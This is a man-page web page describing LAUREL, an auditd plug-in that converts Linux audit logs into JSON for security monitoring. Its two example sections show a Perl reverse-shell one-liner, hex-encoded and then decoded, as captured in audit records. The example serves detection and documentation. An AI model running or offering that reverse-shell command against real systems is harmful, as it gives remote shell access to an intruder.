@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" data-root="../../">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#090c0d" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f5f7f4" media="(prefers-color-scheme: light)">
+<meta name="description" content="High-level description of f[V]laurel(8)f[R] design, rationale, features">
+<title>laurel-about(7) — manpages</title>
+<link rel="icon" href="../../favicon.svg" type="image/svg+xml">
+<link rel="icon" href="../../favicon.ico" sizes="32x32">
+<link rel="manifest" href="../../manifest.webmanifest">
+<link rel="stylesheet" href="../../assets/tokens.css">
+<link rel="stylesheet" href="../../assets/app.css">
+<link rel="stylesheet" href="../../assets/pet.css">
+<script>try{var t=localStorage.getItem('twb-theme');if(t)document.documentElement.setAttribute('data-theme',t);var pm=localStorage.getItem('twb-pet');if(pm!=='cursor')document.documentElement.setAttribute('data-pet',pm==='off'?'off':'float');var ps=parseInt(localStorage.getItem('twb-pet-size'),10);if(ps>=16&&ps<=64)document.documentElement.style.setProperty('--pet-size',ps+'px');var po=parseInt(localStorage.getItem('twb-pet-opacity'),10);if(po>=15&&po<=100)document.documentElement.style.setProperty('--pet-base-opacity',(po/100).toFixed(3));}catch(e){}</script>
+</head>
+<body>
+<a class="skip-link" href="#content">skip to content</a>
+<header class="site-header">
+  <a class="brand" href="../../index.html">man<span class="brand-accent">pages</span></a>
+  <div class="search-wrap">
+    <span class="prompt-char">❯</span>
+    <input id="search" type="search" role="combobox" aria-expanded="false" aria-controls="results" aria-autocomplete="list" aria-label="Search man pages" placeholder="search man pages  ( / )" autocomplete="off" spellcheck="false">
+    <ul id="results" role="listbox" aria-label="Search results" hidden></ul>
+  </div>
+  <a class="nav-link" href="../../browse/index.html">browse</a>
+  <button id="theme-toggle" type="button" title="toggle theme">◐</button>
+</header>
+<main class="page">
+  <nav class="toc" aria-label="Sections">
+    <div class="toc-title">laurel-about(7)</div>
+    <ul><li><a href="#NAME">NAME</a></li><li><a href="#DESCRIPTION">DESCRIPTION</a></li><li><a href="#Problem_statement">Problem
+  statement</a></li><li><a href="#Format_issues">Format
+  issues</a></li><li><a href="#Missing_context">Missing
+  context</a></li><li><a href="#Example">Example</a></li><li><a href="#Solution">Solution</a></li><li><a href="#Output_format">Output
+  format</a></li><li><a href="#Structure">Structure</a></li><li><a href="#Encoding_of_invalid_UTF-8_strings_and_binary_data">Encoding
+  of invalid UTF-8 strings and binary data</a></li><li><a href="#Translation_/_Enrichment">Translation
+  / Enrichment</a></li><li><a href="#Adding_Context:_Process_Relationships,_Labels">Adding
+  Context: Process Relationships, Labels</a></li><li><a href="#Volume_reduction:_Filtering_out_events">Volume
+  reduction: Filtering out events</a></li><li><a href="#Example~2">Example</a></li><li><a href="#Audit_rule_set_advice">Audit
+  rule set advice</a></li><li><a href="#SEE_ALSO">SEE
+  ALSO</a></li><li><a href="#AUTHORS">AUTHORS</a></li></ul>
+  </nav>
+  <article class="man-content" id="content">
+<table class="head">
+  <tr>
+    <td class="head-ltitle">laurel - About(7)</td>
+    <td class="head-vol">System Administration Utilities</td>
+    <td class="head-rtitle">laurel - About(7)</td>
+  </tr>
+</table>
+<div class="manual-text">
+<section class="Sh">
+<h1 class="Sh" id="NAME"><a class="permalink" href="#NAME">NAME</a></h1>
+<p class="Pp">laurel-about - High-level description of laurel(8) design,
+    rationale, features</p>
+</section>
+<section class="Sh">
+<h1 class="Sh" id="DESCRIPTION"><a class="permalink" href="#DESCRIPTION">DESCRIPTION</a></h1>
+<section class="Ss">
+<h2 class="Ss" id="Problem_statement"><a class="permalink" href="#Problem_statement">Problem
+  statement</a></h2>
+<p class="Pp">While logs produced by the Linux Audit subsystem and
+    <i>auditd(8)</i> contain information that can be very useful for host-based
+    security monitoring, the log format is not well-suited for at-scale analysis
+    in a SIEM.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Format_issues"><a class="permalink" href="#Format_issues">Format
+  issues</a></h2>
+<dl class="Bl-tag">
+  <dt>&#x2022;</dt>
+  <dd>All non-trivial events are split across multiple lines that have to be
+      joined together using a message identifier, but current search-centric log
+      analysis systems are quite limited when it comes to join operations.</dd>
+  <dt>&#x2022;</dt>
+  <dd>Files and program executions are logged via PATH and EXECVE elements. The
+      character set for strings is a limited subset of ASCII no escaping
+      mechanism exists: If a string contains bytes that have special meaning in
+      the format (even space or quote characters), the entire string is
+      hex-encoded.</dd>
+  <dt>&#x2022;</dt>
+  <dd>Argument lists are preserved in EXECVE records, but with an
+      a0=&quot;...&quot;, a1=&quot;...&quot;, a2=&quot;...&quot;,
+      a3=&quot;...&quot; naming scheme, they are not easily accessible.</dd>
+  <dt>&#x2022;</dt>
+  <dd>Long command lines may be spread across multiple EXECVE event lines.</dd>
+  <dt>&#x2022;</dt>
+  <dd>For numeric values, there is no clear distinction whether they should be
+      interpreted as decimal, octal, or hexadecimal values.</dd>
+</dl>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Missing_context"><a class="permalink" href="#Missing_context">Missing
+  context</a></h2>
+<p class="Pp">Most audit events are based on either system calls or file
+    operations. Whether or not some suspicious actions should be considered
+    harmful, largely depends on the context in which it takes place. For
+    example, one would not expect most web applications to use netcat to connect
+    to hosts on the Internet, but an administrator who is logged and over SSH
+    who uses netcat to debug network issues should raise fewer suspicions.
+    Unfortunately, the only context that can be added for Linux audit events
+    &#x201C;keys&#x201D; using the -k parameter of auditctl(8).</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Example"><a class="permalink" href="#Example">Example</a></h2>
+<p class="Pp">Spawning a simple Perl reverse-shell one-liner creates the
+    following 7-line audit log entry that nicely demonstrates some of these
+    shortcomings:</p>
+<dl class="Bl-tag">
+  <dt></dt>
+  <dd>
+    <pre>
+type=SYSCALL msg=audit(1626611363.720:348501): arch=c000003e syscall=59 success=yes exit=0 a0=55c094deb5c0 a1=55c094dea770 a2=55c094dbf1b0 a3=fffffffffffff286 items=3 ppid=722076 pid=724395 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=3 comm=&quot;perl&quot; exe=&quot;/usr/bin/perl&quot; subj==unconfined key=(null)?ARCH=x86_64 SYSCALL=execve AUID=&quot;user&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
+type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0=&quot;perl&quot; a1=&quot;-e&quot; a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F61746F6E282469292929297B6F70656E28535444494E2C223E265322293B6F70656E285354444F55542C223E265322293B6F70656E285354444552522C223E265322293B6578656328222F62696E2F7368202D6922293B7D3B
+type=CWD msg=audit(1626611363.720:348501): cwd=&quot;/root&quot;
+type=PATH msg=audit(1626611363.720:348501): item=0 name=&quot;/usr/bin/perl&quot; inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0?OUID=&quot;root&quot; OGID=&quot;root&quot;
+type=PATH msg=audit(1626611363.720:348501): item=1 name=&quot;/usr/bin/perl&quot; inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0?OUID=&quot;root&quot; OGID=&quot;root&quot;
+type=PATH msg=audit(1626611363.720:348501): item=2 name=&quot;/lib64/ld-linux-x86-64.so.2&quot; inode=404797 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0?OUID=&quot;root&quot; OGID=&quot;root&quot;
+type=PROCTITLE msg=audit(1626611363.720:348501): proctitle=7065726C002D650075736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F6174
+    </pre>
+  </dd>
+</dl>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Solution"><a class="permalink" href="#Solution">Solution</a></h2>
+<p class="Pp">In addition to (or instead of) writing log files, auditd(8) can
+    pass log lines to one or multiple plug-ins for further processing, see
+    auditd-plugins(5). laurel(8) is intended to be run as such a plug-in. It
+    reads the audit logs from standard input, parses them, and writes a modified
+    form of the audit log to a different log file.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Output_format"><a class="permalink" href="#Output_format">Output
+  format</a></h2>
+<p class="Pp">Log records carrying the same event ID (the
+    msg=audit(TIME:SEQUENCE): part) are collected into coherent events and
+    output as a JSONlines-based log format. Most importantly, hex-encoded
+    strings are output as regular JSON strings. RfC8259
+    (https://datatracker.ietf.org/doc/html/rfc8259) mandates that &#x201C;text
+    exchanged between systems that are not part of a closed ecosystem MUST be
+    encoded using UTF-8&#x201D;, therefore any bytes or byte sequences that are
+    not valid UTF-8 are percent-encoded as described in RfC3986
+    (https://datatracker.ietf.org/doc/html/rfc3986). Numbers are parsed as
+    decimal, octal, or hexadecimal values and output in an unambiguous format.
+    List data (SYSCALL.{a0 ... a3} and EXECVE.a*) are turned into JSON arrays.
+    PROCTITLE.proctitle is split at NULL bytes and transformed into a list.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Structure"><a class="permalink" href="#Structure">Structure</a></h2>
+<p class="Pp">Every audit log line produced by <i>LAUREL</i> is one single JSON
+    object consisting of key/value pairs that contains at least an ID field.</p>
+<dl class="Bl-tag">
+  <dt>&#x2022;</dt>
+  <dd>SYSCALL, EXECVE, CWD, PROCTITLE fields point to single JSON objects.</dd>
+  <dt>&#x2022;</dt>
+  <dd>PATH, SOCKADDR fields point to lists of JSON objects.</dd>
+</dl>
+<p class="Pp">Every other kernel-produced audit message not mentioned above
+    results in field pointing to a list of JSON objects. Details may change
+    after the list of kernel audit message types has been reviewed.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Encoding_of_invalid_UTF-8_strings_and_binary_data"><a class="permalink" href="#Encoding_of_invalid_UTF-8_strings_and_binary_data">Encoding
+  of invalid UTF-8 strings and binary data</a></h2>
+<dl class="Bl-tag">
+  <dt>&#x2022;</dt>
+  <dd>Most byte values that represent printable ASCII characters are reproduced
+      as-is (but are subject to JSON string escaping rules).</dd>
+  <dt>&#x2022;</dt>
+  <dd>Bytes that map to non-printable ASCII characters (less than 32/0x20;
+      127/0x7f) are percent-encoded.</dd>
+  <dt>&#x2022;</dt>
+  <dd>Byte values that map to % (37/0x25) and + (42/0x2b) are
+    percent-encoded.</dd>
+  <dt>&#x2022;</dt>
+  <dd>Byte values outside of the ASCII range (greater than 127/0x7f) are
+      reproduced as-is if they are part of a valid UTF-8 sequence. Otherwise,
+      they are percent-encoded.</dd>
+</dl>
+<p class="Pp">Handling of special Unicode characters may change in the
+  future.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Translation_/_Enrichment"><a class="permalink" href="#Translation_/_Enrichment">Translation
+  / Enrichment</a></h2>
+<p class="Pp">If auditd(8) has been configured with log_format=ENRICHED, it
+    translates some numeric values in the original audit data to strings. Per
+    convention, it adds translated information using all-caps versions of the
+    keys. For example,</p>
+<dl class="Bl-tag">
+  <dt></dt>
+  <dd>
+    <pre>
+arch=c000003e syscall=59 uid=0
+    </pre>
+  </dd>
+</dl>
+<p class="Pp">get translated to</p>
+<dl class="Bl-tag">
+  <dt></dt>
+  <dd>
+    <pre>
+ARCH=x86_64 SYSCALL=execve UID=&quot;root&quot;
+    </pre>
+  </dd>
+</dl>
+<p class="Pp">by auditd(8). All information that is added to records by
+    laurel(8) follows the same convention, i.e.&#x00A0;keys are turned into
+    all-caps. While laurel can be configured to perform the same translations as
+    auditd(8), it can perform other enrichments, including interpreted scripts,
+    collecting specific environment variables, or container information for
+    processes that are run within container environments.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Adding_Context:_Process_Relationships,_Labels"><a class="permalink" href="#Adding_Context:_Process_Relationships,_Labels">Adding
+  Context: Process Relationships, Labels</a></h2>
+<p class="Pp">While processing audit records laurel(8) tracks processes and
+    remembers comm, exe, and the event ID associated with the latest execve
+    event of a process. Processes that are tracked can be assigned labels
+    through various mechanisms and those labels can optionally be propagated to
+    child processes.</p>
+<p class="Pp">Mechanisms by which labels can be assigned include: - using the
+    key from an audit event (the -k option of auditctl(8)) - regular expression
+    applied to the executable path (SYSCALL.exe field) - regular expression
+    applied to the script path (SYSCALL.SCRIPT field, enriched)</p>
+<p class="Pp">The process tracking information can be used to enrich fields
+    containing process ids, including SYSCALL.{pid, ppid} and OBJ_PID.opid
+    associated with ptrace attach or kill syscalls.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Volume_reduction:_Filtering_out_events"><a class="permalink" href="#Volume_reduction:_Filtering_out_events">Volume
+  reduction: Filtering out events</a></h2>
+<p class="Pp">To reduce the high volume of events, it is possible to filter out
+    events by key or by process label. Events that are filtered are still used
+    for process tracking.</p>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Example~2"><a class="permalink" href="#Example~2">Example</a></h2>
+<p class="Pp">The log lines from the Perl reverse shell execution above are
+    processed by laurel(8) into the following JSON log line:</p>
+<dl class="Bl-tag">
+  <dt></dt>
+  <dd>
+    <pre>
+{&quot;ID&quot;:&quot;1626611363.720:348501&quot;,&quot;SYSCALL&quot;:{&quot;arch&quot;:&quot;0xc000003e&quot;,&quot;syscall&quot;:59,&quot;success&quot;:&quot;yes&quot;,&quot;exit&quot;:0,&quot;a0&quot;:&quot;0x55c094deb5c0&quot;,&quot;a1&quot;:&quot;0x55c094dea770&quot;,&quot;a2&quot;:&quot;0x55c094dbf1b0&quot;,&quot;a3&quot;:&quot;0xfffffffffffff286&quot;,&quot;items&quot;:3,&quot;ppid&quot;:722076,&quot;pid&quot;:724395,&quot;auid&quot;:1000,&quot;uid&quot;:0,&quot;gid&quot;:0,&quot;euid&quot;:0,&quot;suid&quot;:0,&quot;fsuid&quot;:0,&quot;egid&quot;:0,&quot;sgid&quot;:0,&quot;fsgid&quot;:0,&quot;tty&quot;:&quot;pts3&quot;,&quot;ses&quot;:3,&quot;comm&quot;:&quot;perl&quot;,&quot;exe&quot;:&quot;/usr/bin/perl&quot;,&quot;subj&quot;:&quot;=unconfined&quot;,&quot;key&quot;:null,&quot;ARCH&quot;:&quot;x86_64&quot;,&quot;SYSCALL&quot;:&quot;execve&quot;,&quot;AUID&quot;:&quot;user&quot;,&quot;UID&quot;:&quot;root&quot;,&quot;GID&quot;:&quot;root&quot;,&quot;EUID&quot;:&quot;root&quot;,&quot;SUID&quot;:&quot;root&quot;,&quot;FSUID&quot;:&quot;root&quot;,&quot;EGID&quot;:&quot;root&quot;,&quot;SGID&quot;:&quot;root&quot;,&quot;FSGID&quot;:&quot;root&quot;,&quot;PPID&quot;:{&quot;EVENT_ID&quot;:&quot;1626611323.973:348120&quot;,&quot;exe&quot;:&quot;/bin/bash&quot;,&quot;comm&quot;:&quot;bash&quot;,&quot;ppid&quot;:3190631}},&quot;EXECVE&quot;:{&quot;argc&quot;:3,&quot;ARGV&quot;:[&quot;perl&quot;,&quot;-e&quot;,&quot;use Socket;$i=\&quot;10.0.0.1\&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};&quot;]},&quot;CWD&quot;:{&quot;cwd&quot;:&quot;/root&quot;},&quot;PATH&quot;:[{&quot;item&quot;:0,&quot;name&quot;:&quot;/usr/bin/perl&quot;,&quot;inode&quot;:401923,&quot;dev&quot;:&quot;fd:01&quot;,&quot;mode&quot;:&quot;0o100755&quot;,&quot;ouid&quot;:0,&quot;ogid&quot;:0,&quot;rdev&quot;:&quot;00:00&quot;,&quot;nametype&quot;:&quot;NORMAL&quot;,&quot;cap_fp&quot;:&quot;0x0&quot;,&quot;cap_fi&quot;:&quot;0x0&quot;,&quot;cap_fe&quot;:0,&quot;cap_fver&quot;:&quot;0x0&quot;,&quot;cap_frootid&quot;:&quot;0&quot;,&quot;OUID&quot;:&quot;root&quot;,&quot;OGID&quot;:&quot;root&quot;},{&quot;item&quot;:1,&quot;name&quot;:&quot;/usr/bin/perl&quot;,&quot;inode&quot;:401923,&quot;dev&quot;:&quot;fd:01&quot;,&quot;mode&quot;:&quot;0o100755&quot;,&quot;ouid&quot;:0,&quot;ogid&quot;:0,&quot;rdev&quot;:&quot;00:00&quot;,&quot;nametype&quot;:&quot;NORMAL&quot;,&quot;cap_fp&quot;:&quot;0x0&quot;,&quot;cap_fi&quot;:&quot;0x0&quot;,&quot;cap_fe&quot;:0,&quot;cap_fver&quot;:&quot;0x0&quot;,&quot;cap_frootid&quot;:&quot;0&quot;,&quot;OUID&quot;:&quot;root&quot;,&quot;OGID&quot;:&quot;root&quot;},{&quot;item&quot;:2,&quot;name&quot;:&quot;/lib64/ld-linux-x86-64.so.2&quot;,&quot;inode&quot;:404797,&quot;dev&quot;:&quot;fd:01&quot;,&quot;mode&quot;:&quot;0o100755&quot;,&quot;ouid&quot;:0,&quot;ogid&quot;:0,&quot;rdev&quot;:&quot;00:00&quot;,&quot;nametype&quot;:&quot;NORMAL&quot;,&quot;cap_fp&quot;:&quot;0x0&quot;,&quot;cap_fi&quot;:&quot;0x0&quot;,&quot;cap_fe&quot;:0,&quot;cap_fver&quot;:&quot;0x0&quot;,&quot;cap_frootid&quot;:&quot;0&quot;,&quot;OUID&quot;:&quot;root&quot;,&quot;OGID&quot;:&quot;root&quot;}],&quot;PROCTITLE&quot;:{&quot;ARGV&quot;:[&quot;perl&quot;,&quot;-e&quot;,&quot;use Socket;$i=\&quot;10.0.0.1\&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_at&quot;]}}
+    </pre>
+  </dd>
+</dl>
+</section>
+<section class="Ss">
+<h2 class="Ss" id="Audit_rule_set_advice"><a class="permalink" href="#Audit_rule_set_advice">Audit
+  rule set advice</a></h2>
+<p class="Pp">For process tracking to work properly, the kernel should be
+    configured to log all execve-like calls and all fork-like for processes that
+    are expected to ose fork without execve, e.g.&#x00A0;shells:</p>
+<dl class="Bl-tag">
+  <dt></dt>
+  <dd>
+    <pre>
+-a exit,always -F arch=b32 -S execve,execveat -F success=1
+-a exit,always -F arch=b64 -S execve,execveat -F success=1
+-a exit,always -F arch=b32 -S fork,vfork,clone,clone3 -F success=1 -F exe=/bin/sh
+-a exit,always -F arch=b64 -S fork,vfork,clone,clone3 -F success=1 -F exe=/bin/sh
+-a exit,always -F arch=b32 -S fork,vfork,clone,clone3 -F success=1 -F exe=/bin/bash
+-a exit,always -F arch=b64 -S fork,vfork,clone,clone3 -F success=1 -F exe=/bin/bash
+# ...
+    </pre>
+  </dd>
+</dl>
+<p class="Pp">If the fork calls are not needed in the log file, they can be
+    filtered out by assigning a key to those rules in the audit ruleset and
+    adding this key to filter.filter-keys.</p>
+<p class="Pp">Note that older versions of auditd may not understand all the
+    syscalls. In those cases, it may be necessary to substitute the syscall
+    numbers for the ruleset.</p>
+</section>
+</section>
+<section class="Sh">
+<h1 class="Sh" id="SEE_ALSO"><a class="permalink" href="#SEE_ALSO">SEE
+  ALSO</a></h1>
+<p class="Pp">laurel(8), auditd(8), audit.rules(7)</p>
+</section>
+<section class="Sh">
+<h1 class="Sh" id="AUTHORS"><a class="permalink" href="#AUTHORS">AUTHORS</a></h1>
+<dl class="Bl-tag">
+  <dt>&#x2022;</dt>
+  <dd>Hilko Bengen &lt;&lt;bengen@hilluzination.de&gt;&gt;</dd>
+  <dt>&#x2022;</dt>
+  <dd>Sergej Schmidt &lt;&lt;sergej@msgpeek.net&gt;&gt;</dd>
+</dl>
+</section>
+</div>
+<table class="foot">
+  <tr>
+    <td class="foot-date"></td>
+    <td class="foot-os">laurel 0.5.6</td>
+  </tr>
+</table>
+
+  <footer class="page-foot">source: laurel 0.5.6-3build1 · ubuntu 24.04 lts (noble) · generated 2026-07-10 · fully offline</footer>
+  </article>
+</main>
+<script src="../../data/index.js" defer></script>
+<script src="../../assets/search-core.js" defer></script>
+<script src="../../assets/app.js" defer></script>
+<script src="../../assets/pet.js" defer></script>
+<script>if('serviceWorker' in navigator && /^https?:$/.test(location.protocol)){navigator.serviceWorker.register('../../sw.js');}</script>
+</body>
+</html>
